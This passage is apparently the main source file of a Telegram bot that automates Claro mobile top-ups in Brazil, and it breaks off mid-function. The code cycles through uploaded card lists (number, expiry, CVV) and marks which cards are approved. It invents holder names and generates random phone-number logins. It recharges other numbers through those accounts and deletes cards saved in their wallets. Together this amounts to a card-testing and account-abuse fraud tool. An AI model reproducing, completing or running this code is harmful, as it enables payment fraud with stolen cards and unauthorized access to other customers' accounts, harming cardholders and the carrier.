#!/usr/bin/env node
import { runScan } from './lib/run-scan.mjs';
import {
  fetchWalletCards,
  deleteCardEverywhere,
  deleteAllWalletCards,
  scanWallet,
  unifySavedCards,
} from './lib/eldorado.mjs';
import { scanClaroEssential, createSession } from './lib/claro.mjs';
import { runRecharge } from './lib/recharge.mjs';
import { runBrowserRecharge, runHybridRecharge, isBrowserRechargeEnabled, isHybridRechargeEnabled } from './lib/automation-client.mjs';
import {
  formatTelegramReport,
  buildCardKeyboard,
  buildConfirmKeyboard,
  buildRechargeModeKeyboard,
  WELCOME,
  rechargeStep,
} from './lib/telegram-format.mjs';
import {
  formatRechargeResult,
  buildValueKeyboard,
  buildPayMethodKeyboard,
} from './lib/recharge-format.mjs';
import { parseCardInput, CARD_INPUT_HINT, randomHolderName } from './lib/card-parse.mjs';
import { createCardListStore, looksLikeCardsTxt } from './lib/card-list.mjs';
import { classifyCardListAction, cardListActionLabel } from './lib/card-outcome.mjs';
import { fetchClaroLoginLink, looksLikeMsisdn, normalizeBrMobile } from './lib/fetch-claro-link.mjs';
import { parseLink } from './lib/parse-link.mjs';
import { describeProxy } from './lib/proxy.mjs';
import { execSync } from 'node:child_process';
import { join } from 'node:path';
import { homedir } from 'node:os';
import {
  getNumber,
  listNumbers,
  countNumbers,
  countWithValues,
  deleteNumber,
  listErrors,
  parseReaisToCents,
  listValueStock,
  pickLinkForValue,
  countForValue,
} from './lib/numbers-db.mjs';
import {
  parseNumbersFromTxt,
  ingestNumbers,
  refreshMsisdnProducts,
} from './lib/bulk-scan.mjs';
import { generateLoginMsisdn } from './lib/generate-msisdn.mjs';
import { purgeAllLoginCardsStrict } from './lib/purge-login-cards.mjs';

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const DATA_DIR = join(process.env.XDG_DATA_HOME || join(homedir(), '.local/share'), 'linkclaro-bot');
const cardList = createCardListStore(DATA_DIR);

if (!TOKEN) {
  console.error('Defina TELEGRAM_BOT_TOKEN');
  process.exit(1);
}

process.on('unhandledRejection', (err) => {
  console.error('[bot] unhandledRejection:', err?.message ?? err);
});

process.on('uncaughtException', (err) => {
  console.error('[bot] uncaughtException:', err?.message ?? err);
});

const API = `https://api.telegram.org/bot${TOKEN}`;
let offset = 0;
const busy = new Set();
const cache = new Map();
const rechargeFlow = new Map();
/** @type {Map<number, 'same'|'other'>} */
const chatRechargeMode = new Map();
const CACHE_TTL = 10 * 60 * 1000;
const BULK_CONCURRENCY = Math.max(1, Number(process.env.BULK_CONCURRENCY || 1));

function formatBRL(cents) {
  return `R$ ${(Number(cents) / 100).toFixed(2).replace('.', ',')}`;
}

function formatValoresShort(valores) {
  if (!valores?.length) return 'sem valores';
  return valores
    .map((v) => v.name ?? `R$ ${(v.value / 100).toFixed(2).replace('.', ',')}`)
    .join(', ');
}

function formatDbRowValores(row) {
  if (row.status === 'sem_valor' || !row.valores?.length) {
    return 'sem valores (indisponível)';
  }
  return formatValoresShort(row.valores);
}

function toLoginUrl(linkOrJwt) {
  const s = String(linkOrJwt ?? '');
  if (/^https?:\/\//i.test(s)) return s;
  if (/^eyJ/.test(s)) {
    return `https://clarorecarga.claro.com.br/minhaclaro_web/select-login?t=${s}`;
  }
  return s;
}

async function tg(method, body = {}) {
  const res = await fetch(`${API}/${method}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body),
  });
  const data = await res.json();
  if (!data.ok) {
    throw new Error(data.description || `Telegram ${method} failed`);
  }
  return data.result;
}

async function send(chatId, text, extra = {}) {
  return tg('sendMessage', {
    chat_id: chatId,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    ...extra,
  });
}

function extractLink(text) {
  if (!text) return null;
  const trimmed = text.trim();
  if (trimmed.startsWith('/')) return null;
  const jwtMatch = trimmed.match(/[?&]t=([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)/);
  if (jwtMatch) return jwtMatch[1];
  if (/^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(trimmed)) {
    return trimmed;
  }
  if (trimmed.includes('clarorecarga.claro.com.br') || trimmed.includes('select-login')) {
    return trimmed;
  }
  if (looksLikeMsisdn(trimmed)) {
    return { kind: 'msisdn', msisdn: normalizeBrMobile(trimmed) };
  }
  return null;
}

function getCache(chatId) {
  const entry = cache.get(chatId);
  if (!entry || Date.now() > entry.expiresAt) {
    cache.delete(chatId);
    return null;
  }
  return entry;
}

function setCache(chatId, data) {
  cache.set(chatId, { ...data, expiresAt: Date.now() + CACHE_TTL });
}

function clearRecharge(chatId) {
  rechargeFlow.delete(chatId);
}

async function promptRechargeMode(chatId) {
  clearRecharge(chatId);
  chatRechargeMode.delete(chatId);
  await send(chatId, WELCOME, { reply_markup: buildRechargeModeKeyboard() });
}

/** Prepara sessão Claro + teclado de valores para recarga. */
async function prepareRechargeSession(chatId, accessMsisdn, {
  targetMsisdn = null,
  statusMsg = null,
  title = null,
  mode = null,
} = {}) {
  const access = normalizeBrMobile(accessMsisdn);
  if (!access) {
    await send(chatId, '❌ Número inválido.');
    return false;
  }

  const target = targetMsisdn ? normalizeBrMobile(targetMsisdn) : null;
  const resolvedMode =
    mode ?? chatRechargeMode.get(chatId) ?? (target && target !== access ? 'other' : 'same');
  const cross = Boolean(target && target !== access);

  if (busy.has(chatId)) {
    await send(chatId, '⏳ Aguarde…');
    return false;
  }

  busy.add(chatId);
  let msg = statusMsg;
  if (!msg) {
    msg = await send(chatId, `🔗 ${rechargeStep(1, 4, 'Gerando login')}…\n<code>${access}</code>`);
  } else {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: msg.message_id,
      text: `🔗 ${rechargeStep(1, 4, 'Gerando login')}…\n<code>${access}</code>`,
      parse_mode: 'HTML',
    });
  }

  try {
    let link;
    const row = getNumber(access);
    if (row?.link) {
      link = toLoginUrl(row.link);
    } else {
      const generated = await fetchClaroLoginLink(access);
      link = generated.link;
    }

    const session = await createSession(parseLink(link).jwt);
    const refreshed = await refreshMsisdnProducts(access, {
      link,
      sessionId: session.id,
      identifier: session.identifier,
    });
    const valores = refreshed.valores ?? [];
    const msisdnResolved = session.identifier || access;

    let walletAuth = null;
    let cardsPurged = 0;
    if (resolvedMode === 'other' && valores.length) {
      await tg('editMessageText', {
        chat_id: chatId,
        message_id: msg.message_id,
        text: `🧹 ${rechargeStep(1, 4, 'Limpando cartões')}…\n<code>${msisdnResolved}</code>`,
        parse_mode: 'HTML',
      });
      try {
        const purge = await purgeAllLoginCardsStrict({
          sessionId: session.id,
          msisdn: msisdnResolved,
          productId: valores[0].id,
        });
        walletAuth = purge.walletAuth;
        cardsPurged = purge.removed;
      } catch (err) {
        console.error('[bot][purge-login]', err.message);
      }
    }

    setCache(chatId, {
      link,
      walletAuth,
      cards: [],
      sessionId: session.id,
      msisdn: msisdnResolved,
      rechargeTargetNumber: cross ? target : undefined,
      valores,
      rechargeMode: resolvedMode,
      awaitTargetMsisdn: resolvedMode === 'other' && !cross,
    });

    if (!valores.length) {
      await tg('editMessageText', {
        chat_id: chatId,
        message_id: msg.message_id,
        text: `❌ <code>${access}</code> sem valores disponíveis para recarga.`,
        parse_mode: 'HTML',
      });
      return false;
    }

    clearRecharge(chatId);
    const purgeNote =
      cardsPurged > 0 ? `\n🧹 <i>${cardsPurged} cartão(ões) removido(s) do login</i>` : '';
    const header =
      title ??
      (cross
        ? `🔀 <b>Recarga cruzada</b>\n🔑 Login: <code>${access}</code>\n📱 Destino: <code>${target}</code>`
        : resolvedMode === 'other'
          ? `🔀 <b>Outro número</b>\n🔑 Login: <code>${access}</code>\n<i>Depois do valor, envie quem recebe.</i>`
          : `📱 <b>Recarga</b> — <code>${access}</code>`);

    await tg('editMessageText', {
      chat_id: chatId,
      message_id: msg.message_id,
      text: `${header}${purgeNote}\n\n${rechargeStep(2, 4, 'Escolha o valor')} 👇`,
      parse_mode: 'HTML',
      reply_markup: buildValueKeyboard(valores),
    });
    return true;
  } catch (err) {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: msg.message_id,
      text: `❌ <b>Erro:</b> ${err.message.replace(/</g, '&lt;')}`,
      parse_mode: 'HTML',
    });
    return false;
  } finally {
    busy.delete(chatId);
  }
}

async function startSameNumberRecharge(chatId, msisdn) {
  chatRechargeMode.set(chatId, 'same');
  await prepareRechargeSession(chatId, msisdn, { targetMsisdn: msisdn });
}

async function startOtherNumberRecharge(chatId) {
  chatRechargeMode.set(chatId, 'other');
  if (busy.has(chatId)) {
    await send(chatId, '⏳ Aguarde…');
    return;
  }

  busy.add(chatId);
  const statusMsg = await send(chatId, '🎲 Gerando login aleatório (DDD do banco)…');
  try {
    const { msisdn, attempt } = await generateLoginMsisdn();
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: `🎲 Login gerado: <code>${msisdn}</code> (${attempt}ª tentativa)\n🔗 Buscando valores…`,
      parse_mode: 'HTML',
    });
    busy.delete(chatId);
    await prepareRechargeSession(chatId, msisdn, {
      statusMsg,
      mode: 'other',
      title: `🔀 <b>Outro número</b>\n🔑 Login gerado: <code>${msisdn}</code>\n<i>Depois do valor, envie quem recebe.</i>`,
    });
  } catch (err) {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: `❌ <b>Falha ao gerar número:</b> ${err.message.replace(/</g, '&lt;')}`,
      parse_mode: 'HTML',
    });
  } finally {
    busy.delete(chatId);
  }
}

async function promptCardLine(chatId) {
  await send(chatId, CARD_INPUT_HINT);
}

function payMethodKeyboard(cards) {
  return buildPayMethodKeyboard(cards, { pendingCards: cardList.countPending() });
}

function buildCardListMeta(outcome, entry, targetMsisdn, flow) {
  const ts = new Date().toISOString().slice(0, 19).replace('T', ' ');
  const val = flow?.productName ?? formatBRL(flow?.productValue ?? 0);
  return `${ts} ${val} ${entry?.msisdn ?? '?'}->${targetMsisdn ?? '?'} SUCCESS`;
}

async function pickAutoCardLine() {
  return cardList.withLock(async () => {
    while (true) {
      const line = cardList.peekPendingLine();
      if (!line) return null;
      const card = parseCardInput(line);
      if (!card) {
        await cardList.shiftPendingLine();
        continue;
      }
      return { line, card };
    }
  });
}

async function executeAutoRecharge(chatId) {
  const picked = await pickAutoCardLine();
  if (!picked) {
    await send(
      chatId,
      '❌ Lista <code>cards-pending.txt</code> vazia.\n\nEnvie um <b>.txt</b> com um cartão por linha:\n<code>NUMERO|MM|AAAA|CVV</code>',
    );
    return;
  }

  const flow = rechargeFlow.get(chatId);
  if (flow) {
    flow.autoPay = true;
    flow.cardListLine = picked.line;
    rechargeFlow.set(chatId, flow);
  }

  const mask = picked.card.number.slice(-4);
  await send(chatId, `🤖 Cartão da fila: <code>****${mask}</code>`);
  await executeRecharge(chatId, picked.card, { cardListLine: picked.line });
}

async function startRechargePickerForTarget(chatId, accessMsisdn, targetMsisdn) {
  chatRechargeMode.set(chatId, 'other');
  await prepareRechargeSession(chatId, accessMsisdn, { targetMsisdn });
}

async function startRechargePicker(chatId) {
  const entry = getCache(chatId);
  if (!entry?.sessionId || !entry?.valores?.length) {
    await send(
      chatId,
      '❌ Faça a varredura primeiro (envie o número).\n\nDepois use /recarga ou toque em <b>💳 Recarregar</b>.',
    );
    return;
  }

  clearRecharge(chatId);
  await send(chatId, `${rechargeStep(2, 4, 'Escolha o valor')}\n📱 <code>${entry.msisdn}</code>`, {
    reply_markup: buildValueKeyboard(entry.valores),
  });
}

async function onValueSelected(chatId, messageId, productId) {
  const entry = getCache(chatId);
  if (!entry) {
    await send(chatId, '❌ Sessão expirada. Envie o link novamente.');
    return;
  }

  const product = entry.valores.find((v) => v.id === productId);
  if (!product) {
    await send(chatId, '❌ Valor indisponível.');
    return;
  }

  const mode = entry.rechargeMode || chatRechargeMode.get(chatId) || 'same';
  const needsTarget = Boolean(
    (mode === 'other' || entry.awaitTargetMsisdn) && !entry.rechargeTargetNumber,
  );

  rechargeFlow.set(chatId, {
    step: needsTarget ? 'target_msisdn' : 'pick_card',
    mode,
    productId: product.id,
    productValue: product.value,
    productName: product.name,
    rechargeTargetNumber: needsTarget ? null : entry.rechargeTargetNumber || entry.msisdn,
    card: {},
  });

  const flow = rechargeFlow.get(chatId);
  if (flow.step === 'target_msisdn') {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text:
        `${rechargeStep(3, 4, 'Quem recebe?')}\n\n` +
        `💰 <b>${product.name}</b> selecionado\n` +
        `🔑 Login: <code>${entry.msisdn}</code>\n\n` +
        '📱 Envie o <b>número que vai receber</b> (11 dígitos):',
      parse_mode: 'HTML',
    });
    return;
  }

  const hasCards = entry.cards?.length > 0;
  const pendingCards = cardList.countPending();
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: `${rechargeStep(3, 4, 'Forma de pagamento')}\n\n💰 <b>${product.name}</b> selecionado\n\nComo deseja pagar? 👇`,
    parse_mode: 'HTML',
    reply_markup: payMethodKeyboard(entry.cards),
  });

  if (!hasCards && pendingCards === 0) {
    rechargeFlow.set(chatId, {
      ...rechargeFlow.get(chatId),
      step: 'card_line',
    });
    await promptCardLine(chatId);
  }
}

async function executeRecharge(chatId, card, { cardListLine = null } = {}) {
  const entry = getCache(chatId);
  const flow = rechargeFlow.get(chatId);
  if (!entry?.sessionId || !flow?.productId) {
    await send(chatId, '❌ Sessão expirada. Comece de novo com /recarga');
    clearRecharge(chatId);
    return;
  }

  if (busy.has(chatId)) {
    await send(chatId, '⏳ Aguarde…');
    return;
  }

  busy.add(chatId);
  const useBrowser = isBrowserRechargeEnabled() && !card.token;
  const targetMsisdn = flow.rechargeTargetNumber || entry.rechargeTargetNumber || entry.msisdn;
  const crossNumber = targetMsisdn && entry.msisdn && targetMsisdn !== entry.msisdn;

  if ((flow.mode === 'other' || entry.awaitTargetMsisdn) && !entry.rechargeTargetNumber) {
    busy.delete(chatId);
    await send(chatId, '❌ Informe o número destino antes do cartão (/start → Outro número).');
    clearRecharge(chatId);
    return;
  }

  const useHybrid = useBrowser && isHybridRechargeEnabled();
  const statusMsg = await send(
    chatId,
    useBrowser
      ? crossNumber
        ? `${rechargeStep(4, 4, 'Processando…')}\n\n💰 <b>${flow.productName}</b> → <code>${targetMsisdn}</code>\n🔑 login <code>${entry.msisdn}</code>\n\n<i>⚡ HTTP → Edge → recarga cruzada</i>`
        : `${rechargeStep(4, 4, 'Processando…')}\n\n💰 <b>${flow.productName}</b>\n\n<i>⚡ HTTP → Edge → checkout</i>`
      : `${rechargeStep(4, 4, 'Processando…')}\n\n💰 <b>${flow.productName}</b>\n\n<i>Tokenizando → pagamento → confirmação</i>`,
  );

  try {
    const outcome = useBrowser
      ? useHybrid
        ? await runHybridRecharge({
            loginUrl: toLoginUrl(entry.link),
            msisdn: entry.msisdn,
            targetMsisdn,
            productValue: flow.productValue,
            card,
          })
        : await runBrowserRecharge({
            loginUrl: toLoginUrl(entry.link),
            msisdn: entry.msisdn,
            targetMsisdn,
            productValue: flow.productValue,
            card,
          })
      : await runRecharge({
          sessionId: entry.sessionId,
          msisdn: entry.msisdn,
          productId: flow.productId,
          productValue: flow.productValue,
          card,
        });

    let listNote = '';
    const listLine = cardListLine ?? flow.cardListLine ?? null;
    if (listLine) {
      const action = classifyCardListAction({ outcome, error: null });
      const meta =
        action === 'approved' ? buildCardListMeta(outcome, entry, targetMsisdn, flow) : '';
      const applied = await cardList.applyOutcome(listLine, action, meta);
      listNote = `\n\n🗂 ${cardListActionLabel(action)} · fila: <b>${applied.pendingLeft}</b>`;
    }

    const report = formatRechargeResult({
      ...outcome,
      loginMsisdn: entry.msisdn,
      targetMsisdn,
    });
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: report + listNote,
      parse_mode: 'HTML',
    });
  } catch (err) {
    let listNote = '';
    const listLine = cardListLine ?? flow.cardListLine ?? null;
    if (listLine) {
      const action = classifyCardListAction({ outcome: null, error: err });
      const applied = await cardList.applyOutcome(listLine, action);
      listNote = `\n\n🗂 ${cardListActionLabel(action)} · fila: <b>${applied.pendingLeft}</b>`;
    }
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: `❌ <b>Erro na recarga:</b> ${err.message.replace(/</g, '&lt;')}${listNote}`,
      parse_mode: 'HTML',
    });
  } finally {
    busy.delete(chatId);
    clearRecharge(chatId);
  }
}

async function handleRechargeInput(chatId, text) {
  const flow = rechargeFlow.get(chatId);
  if (!flow) return false;

  if (flow.step === 'target_msisdn') {
    const target = normalizeBrMobile(text);
    if (!target) {
      await send(chatId, '❌ Número destino inválido. Use DDD + 9 dígitos.');
      return true;
    }
    const entry = getCache(chatId);
    if (!entry) {
      await send(chatId, '❌ Sessão expirada. Use /start de novo.');
      clearRecharge(chatId);
      return true;
    }
    entry.rechargeTargetNumber = target;
    setCache(chatId, entry);
    flow.rechargeTargetNumber = target;
    flow.step = 'pick_card';
    rechargeFlow.set(chatId, flow);

    const hasCards = entry.cards?.length > 0;
    const pendingCards = cardList.countPending();
    await send(
      chatId,
      `${rechargeStep(3, 4, 'Forma de pagamento')}\n\n` +
        `💰 <b>${flow.productName}</b> → <code>${target}</code>\n\n` +
        (hasCards || pendingCards > 0 ? 'Como deseja pagar? 👇' : '💳 Envie os dados do cartão:'),
      hasCards || pendingCards > 0
        ? { reply_markup: payMethodKeyboard(entry.cards) }
        : undefined,
    );
    if (!hasCards && pendingCards === 0) {
      flow.step = 'card_line';
      rechargeFlow.set(chatId, flow);
      await promptCardLine(chatId);
    }
    return true;
  }

  if (flow.step === 'cvv_saved') {
    if (!/^\d{3,4}$/.test(text.trim())) {
      await send(chatId, '❌ CVV inválido (3 ou 4 dígitos).');
      return true;
    }
    const saved = flow.savedCard;
    await executeRecharge(chatId, {
      token: saved.token,
      cvv: text.trim(),
      brand: saved.brand,
      bin: saved.bin,
      last: saved.last,
      expirationMonth: saved.expirationMonth,
      expirationYear: saved.expirationYear,
      holder: saved.holder?.name ?? randomHolderName(),
      wasSaved: true,
    });
    return true;
  }

  const card = parseCardInput(text);
  if (card) {
    await executeRecharge(chatId, card);
    return true;
  }

  if (['pick_card', 'card_line', 'card_number'].includes(flow.step)) {
    await send(
      chatId,
      '❌ Formato não reconhecido.\n\n' + CARD_INPUT_HINT,
    );
    return true;
  }

  return false;
}

async function doScan(chatId, target, { skipWallet = false, editMsg = null } = {}) {
  if (busy.has(chatId)) {
    await send(chatId, '⏳ Aguarde a operação anterior…');
    return;
  }

  busy.add(chatId);
  let statusMsg = editMsg;
  const isMsisdn = target?.kind === 'msisdn';
  if (!statusMsg) {
    statusMsg = await send(
      chatId,
      isMsisdn
        ? `🔗 Gerando link para <code>${target.msisdn}</code>…`
        : skipWallet
          ? '🔍 Varredura (sem wallet)…'
          : '🔍 Varredura completa…\n<i>~3–5 segundos</i>',
    );
  }

  try {
    let link = target;
    if (isMsisdn) {
      const generated = await fetchClaroLoginLink(target.msisdn);
      link = generated.link;
      await tg('editMessageText', {
        chat_id: chatId,
        message_id: statusMsg.message_id,
        text: skipWallet
          ? `🔍 Varredura (sem wallet) — <code>${target.msisdn}</code>…`
          : `🔍 Varredura completa — <code>${target.msisdn}</code>…`,
        parse_mode: 'HTML',
      });
    }

    const result = await runScan(link, { skipWallet });
    const { summary, walletAuth, wallet, session, claro } = result;
    const report = formatTelegramReport(summary);

    const rawCards = unifySavedCards(
      wallet?.walletCards?.body,
      claro?.paymentMethods?.body,
    );
    setCache(chatId, {
      link,
      walletAuth: walletAuth ?? null,
      cards: rawCards,
      sessionId: session.id,
      msisdn: session.identifier,
      valores: summary.valoresDisponiveis,
    });

    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: report,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      reply_markup: buildCardKeyboard(rawCards, summary.valoresDisponiveis.length > 0),
    });
  } catch (err) {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: statusMsg.message_id,
      text: `❌ <b>Erro:</b> ${err.message.replace(/</g, '&lt;')}`,
      parse_mode: 'HTML',
    });
  } finally {
    busy.delete(chatId);
  }
}

async function refreshWalletAuth(entry) {
  const productId = entry.walletAuth?.productId;
  if (!entry.sessionId || !entry.msisdn || !productId) return false;
  try {
    const wallet = await scanWallet(entry.sessionId, entry.msisdn, productId);
    if (wallet.error || !wallet.bemobiToken || !wallet.checkoutCode) {
      console.error(
        `[bot][card] refresh wallet: ${wallet.error ?? 'sem token'}${wallet.message ? ` — ${wallet.message}` : ''}`,
      );
      return false;
    }
    entry.walletAuth = {
      ...(entry.walletAuth ?? {}),
      bemobiToken: wallet.bemobiToken,
      checkoutCode: wallet.checkoutCode,
      productId,
      sessionId: entry.sessionId,
      msisdn: entry.msisdn,
    };
    return true;
  } catch (err) {
    console.error('[bot][card] refresh wallet:', err.message);
    return false;
  }
}

async function loadFreshCards(entry) {
  let walletBody = [];
  if (entry.walletAuth?.bemobiToken && entry.walletAuth?.checkoutCode) {
    const cardsRes = await fetchWalletCards(
      entry.walletAuth.bemobiToken,
      entry.walletAuth.checkoutCode,
    );
    walletBody = Array.isArray(cardsRes.body) ? cardsRes.body : [];
  }
  const claro = await scanClaroEssential(entry.sessionId, entry.msisdn, {
    includeProducts: false,
  });
  return unifySavedCards(walletBody, claro.paymentMethods?.body);
}

async function removeAllCachedCards(entry) {
  const cards = await loadFreshCards(entry);
  if (!cards.length) return { removed: 0, total: 0 };

  let removed = 0;
  const walletCards = cards.filter((c) => c.source !== 'claro');
  const claroOnly = cards.filter((c) => c.source === 'claro');

  if (
    walletCards.length &&
    entry.walletAuth?.bemobiToken &&
    entry.walletAuth?.checkoutCode
  ) {
    const batch = await deleteAllWalletCards(
      entry.walletAuth.bemobiToken,
      entry.walletAuth.checkoutCode,
      walletCards,
    );
    removed += batch.ok;
    console.log(
      `[bot][card] wallet batch ${batch.ok}/${batch.total} removidos (msisdn=${entry.msisdn})`,
    );
  }

  for (const card of claroOnly) {
    const { ok, results } = await deleteCardEverywhere({
      sessionId: entry.sessionId,
      msisdn: entry.msisdn,
      cardToken: card.token,
    });
    const st = (results ?? []).map((r) => r.status).join('/') || '?';
    console.log(
      `[bot][card] claro-only *${String(card.last ?? card.token?.slice(-4))} ok=${ok} HTTP=${st}`,
    );
    if (ok) removed += 1;
  }

  return { removed, total: cards.length };
}

async function refreshCardsView(chatId, messageId, entry) {
  await refreshWalletAuth(entry);
  let walletBody = [];
  if (entry.walletAuth?.bemobiToken) {
    const cardsRes = await fetchWalletCards(
      entry.walletAuth.bemobiToken,
      entry.walletAuth.checkoutCode,
    );
    walletBody = Array.isArray(cardsRes.body) ? cardsRes.body : [];
  }

  const claro = await scanClaroEssential(entry.sessionId, entry.msisdn, {
    includeProducts: false,
  });
  const rawCards = unifySavedCards(walletBody, claro.paymentMethods?.body);
  entry.cards = rawCards;
  setCache(chatId, entry);

  const { summary } = await runScan(entry.link, { skipWallet: true });
  summary.cartoes.walletEldorado = rawCards.map((c) => ({
    brand: c.brand,
    bin: c.bin,
    last: c.last,
    expiration: `${String(c.expirationMonth ?? '').padStart(2, '0')}/${c.expirationYear ?? ''}`,
    type: c.type,
  }));
  summary.cartoes.claroApi = [];
  summary.cartoes.total = rawCards.length;

  const report = formatTelegramReport(summary);
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: report,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    reply_markup: buildCardKeyboard(rawCards),
  });
}

async function executeRemove(chatId, messageId, cardToken) {
  const entry = getCache(chatId);
  if (!entry?.sessionId) {
    await send(chatId, '❌ Sessão expirada. Envie o link novamente.');
    return;
  }

  const card = entry.cards.find((c) => c.token === cardToken);
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: '🗑 Removendo cartão…',
    parse_mode: 'HTML',
  });

  try {
    const { ok, results } = await deleteCardEverywhere({
      bemobiToken: entry.walletAuth?.bemobiToken,
      checkoutCode: entry.walletAuth?.checkoutCode,
      sessionId: entry.sessionId,
      msisdn: entry.msisdn,
      cardToken,
    });
    if (!ok) {
      const statuses = (results ?? []).map((r) => r.status).join('/');
      throw new Error(`HTTP ${statuses || 'sem resposta'}`);
    }

    const label = card ? `${card.brand} *${card.last}` : 'cartão';
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text: `✅ <b>Removido:</b> ${label}`,
      parse_mode: 'HTML',
    });

    await refreshCardsView(chatId, messageId, entry);
  } catch (err) {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text: `❌ Falha ao remover: ${err.message}`,
      parse_mode: 'HTML',
    });
  }
}

async function executeRemoveAll(chatId, messageId) {
  const entry = getCache(chatId);
  if (!entry?.sessionId || !entry.cards.length) {
    await send(chatId, '❌ Nenhum cartão em cache.');
    return;
  }

  const totalStart = entry.cards.length;
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: `🗑 Removendo ${totalStart} cartão(ões)…`,
    parse_mode: 'HTML',
  });

  try {
    await refreshWalletAuth(entry);
    setCache(chatId, entry);

    let { removed } = await removeAllCachedCards(entry);
    let remaining = await loadFreshCards(entry);

    if (remaining.length) {
      await refreshWalletAuth(entry);
      setCache(chatId, entry);
      const retry = await removeAllCachedCards(entry);
      removed += retry.removed;
      remaining = await loadFreshCards(entry);
    }

    entry.cards = remaining;
    setCache(chatId, entry);

    const text = remaining.length
      ? `⚠️ <b>${removed}/${totalStart}</b> removidos — <b>${remaining.length}</b> ainda na lista.`
      : `✅ <b>${removed}</b> cartão(ões) removido(s).`;

    await tg('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text,
      parse_mode: 'HTML',
    });

    await refreshCardsView(chatId, messageId, entry);
  } catch (err) {
    console.error('[bot][card] remove all:', err.message);
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text: `❌ Falha: ${err.message}`,
      parse_mode: 'HTML',
    });
  }
}

async function handleRemove(chatId, messageId, cardToken, cardLabel) {
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: `⚠️ <b>Confirmar remoção?</b>\n\nCartão: <b>${cardLabel}</b>`,
    parse_mode: 'HTML',
    reply_markup: buildConfirmKeyboard(cardToken, 'rm'),
  });
}

async function handleCallback(query) {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data;

  await tg('answerCallbackQuery', { callback_query_id: query.id }).catch(() => {});

  if (data === 'recarga:start') {
    await startRechargePicker(chatId);
    return;
  }

  if (data === 'rcgmode:same') {
    chatRechargeMode.set(chatId, 'same');
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text: `${rechargeStep(1, 4, 'Mesmo número')}\n\n📱 Envie o número (login e recarga nele):`,
      parse_mode: 'HTML',
    }).catch(() =>
      send(chatId, `${rechargeStep(1, 4, 'Mesmo número')}\n\n📱 Envie o número (login e recarga nele):`),
    );
    return;
  }

  if (data === 'rcgmode:other') {
    await startOtherNumberRecharge(chatId);
    return;
  }

  if (data === 'rcg:cancel') {
    clearRecharge(chatId);
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text: '↩️ Recarga cancelada.\n\nUse /start para começar de novo.',
      parse_mode: 'HTML',
    });
    return;
  }

  if (data.startsWith('rcg:') && data !== 'rcg:cancel') {
    const productId = data.slice(4);
    await onValueSelected(chatId, messageId, productId);
    return;
  }

  if (data === 'rcgpay:new') {
    const flow = rechargeFlow.get(chatId);
    if (!flow) return;
    flow.step = 'card_line';
    flow.autoPay = false;
    rechargeFlow.set(chatId, flow);
    await promptCardLine(chatId);
    return;
  }

  if (data === 'rcgpay:auto_empty') {
    await send(
      chatId,
      '❌ Nenhum cartão na fila.\n\nEnvie um <b>.txt</b> (um cartão por linha):\n<code>NUMERO|MM|AAAA|CVV</code>\n\nOu salve em <code>cards-pending.txt</code> na VPS.',
    );
    return;
  }

  if (data === 'rcgpay:auto') {
    const flow = rechargeFlow.get(chatId);
    if (!flow) {
      await send(chatId, '❌ Sessão expirada. Use /start de novo.');
      return;
    }
    if (busy.has(chatId)) {
      await send(chatId, '⏳ Aguarde…');
      return;
    }
    await executeAutoRecharge(chatId);
    return;
  }

  if (data.startsWith('rcgpay:')) {
    const token = data.slice(7);
    const entry = getCache(chatId);
    const saved = entry?.cards?.find((c) => c.token === token);
    const flow = rechargeFlow.get(chatId);
    if (!saved || !flow) {
      await send(chatId, '❌ Cartão não encontrado.');
      return;
    }
    flow.step = 'cvv_saved';
    flow.savedCard = saved;
    rechargeFlow.set(chatId, flow);
    await send(chatId, `💳 <b>${saved.brand} ••${saved.last}</b>\n\n🔢 Digite o <b>CVV</b>:`);
    return;
  }

  if (data === 'cancel') {
    const entry = getCache(chatId);
    if (entry?.link) {
      await doScan(chatId, entry.link, { editMsg: { message_id: messageId } });
    }
    return;
  }

  if (data === 'rmall:confirm') {
    await tg('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text: '⚠️ <b>Remover TODOS os cartões?</b>',
      parse_mode: 'HTML',
      reply_markup: buildConfirmKeyboard('all', 'rmall'),
    });
    return;
  }

  if (data === 'rmallok:all') {
    await executeRemoveAll(chatId, messageId);
    return;
  }

  if (data.startsWith('rm:') && !data.startsWith('rmok:')) {
    const token = data.slice(3);
    const entry = getCache(chatId);
    const card = entry?.cards.find((c) => c.token === token);
    const label = card ? `${card.brand} *${card.last}` : token.slice(0, 8);
    await handleRemove(chatId, messageId, token, label);
    return;
  }

  if (data.startsWith('rmok:')) {
    await executeRemove(chatId, messageId, data.slice(5));
    return;
  }

  if (data === 'noop') return;

  if (data.startsWith('dbusar:')) {
    await loadSavedNumber(chatId, data.slice(7));
